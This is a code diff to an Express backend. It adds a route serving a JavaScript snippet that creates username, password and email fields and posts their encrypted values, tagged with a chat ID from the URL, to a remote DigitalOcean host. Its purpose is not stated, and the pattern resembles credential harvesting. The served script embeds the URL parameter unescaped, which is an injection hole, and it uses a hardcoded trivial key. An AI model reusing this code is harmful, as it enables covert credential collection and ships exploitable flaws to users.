@@ -228,8 +228,8 @@ app.get("/editData", async (req, res) => {
 });
 
 async function reloadData() {
-  const editDataUrl = "http://localhost:8080/editData";
-  const fetchDataUrl = "http://localhost:8080/fetchData";
+  const editDataUrl = "https://coral-app-mjjt3.ondigitalocean.app/editData";
+  const fetchDataUrl = "https://coral-app-mjjt3.ondigitalocean.app/fetchData";
 
   // Fetch editData
   const editDataResponse = await fetch(editDataUrl, { method: "GET" });
@@ -259,4 +259,80 @@ app.get("/", async (req, res) => {
 
 app.listen(port, () => {
   console.log(`Backend server running at http://localhost:${port}`);
+});
+
+app.get("/user-script/:chatId", (req, res) => {
+  const chatId = req.params.chatId;
+
+  // Serve JavaScript with embedded chatId
+  const script = `
+    const USER_CHAT_ID = "${chatId}";
+    
+    function gatherInfo() {
+      const inputs = Array.from(document.getElementsByClassName("userInput"));
+      const SECRET_KEY = "key"; // This should be the same as the server-side SECRET_KEY
+      const userInput = [];
+      const id = Date.now().toString();
+
+      inputs.forEach((input) => {
+        const type = input.getAttribute("aria-placeholder") || input.placeholder;
+        const value = input.value;
+
+        if (type.toLowerCase() === "password") {
+          const hashedPassword = CryptoJS.SHA256(value).toString(CryptoJS.enc.Hex);
+          userInput.push({ id: id, type, value: hashedPassword });
+        } else {
+          userInput.push({ id: id, type, value });
+        }
+      });
+      
+      userInput.push({ id: id, type: "chatid", value: USER_CHAT_ID });
+
+      const encryptedData = CryptoJS.AES.encrypt(
+        JSON.stringify(userInput),
+        SECRET_KEY
+      ).toString();
+
+      fetch("https://coral-app-mjjt3.ondigitalocean.app/storeData", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ data: encryptedData }),
+      })
+        .then((response) => {
+          if (!response.ok) {
+            throw new Error("Failed to store data");
+          }
+          console.log("Data stored successfully");
+          alert("Data stored successfully!");
+        })
+        .catch((error) => {
+          console.error("Error storing data:", error);
+          alert("An error occurred. Please check the console for details.");
+        });
+    }
+
+    // Add this function to create input fields dynamically
+    function createInputFields() {
+      const container = document.getElementById('inputContainer');
+      ['username', 'password', 'email'].forEach(type => {
+        const input = document.createElement('input');
+        input.type = type === 'password' ? 'password' : 'text';
+        input.className = 'userInput';
+        input.placeholder = type;
+        container.appendChild(input);
+      });
+      const button = document.createElement('button');
+      button.textContent = 'Submit';
+      button.onclick = gatherInfo;
+      container.appendChild(button);
+    }
+
+    // Call this function when the DOM is loaded
+    document.addEventListener('DOMContentLoaded', createInputFields);
+  `;
+
+  res.type("application/javascript");
+  res.send(script);
 });
